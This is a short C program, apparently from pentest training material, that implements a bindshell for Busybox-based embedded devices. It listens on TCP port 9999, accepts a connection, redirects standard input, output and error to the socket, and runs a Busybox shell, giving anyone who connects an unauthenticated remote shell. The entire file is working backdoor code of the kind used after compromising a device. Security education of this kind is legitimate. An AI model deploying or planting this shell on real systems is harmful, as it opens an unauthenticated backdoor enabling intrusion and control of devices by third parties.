/*

                Bindshell for Embedded System running Busybox 

                Author - Vivek Ramachandran 

                http://PentesterAcademy.com 
                http://SecurityTube-Training.com
                http://SecurityTube.net


*/

#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<unistd.h>


#define SERVER_PORT     9999

int main()
{

        int serverfd, clientfd;
        char *args[] = { "/bin/busybox", "sh", NULL };
        struct sockaddr_in server, client;
        socklen_t len = sizeof(struct sockaddr);

        server.sin_family = AF_INET;
        server.sin_port = htons(SERVER_PORT);
        server.sin_addr.s_addr = INADDR_ANY; 


        printf("Sleeping before trying to start server ...");
        sleep(5);

        printf("Starting bindshell on port %d", SERVER_PORT);

        serverfd = socket(AF_INET, SOCK_STREAM, 0);

        bind(serverfd, (struct sockaddr *)&server, sizeof(server));

        listen(serverfd, 1);

        clientfd = accept(serverfd, (struct sockaddr *)&client, &len);

        dup2(clientfd, 0);
        dup2(clientfd, 1);
        dup2(clientfd, 2);

        execve("/bin/busybox", args, NULL);

        return 0;

}
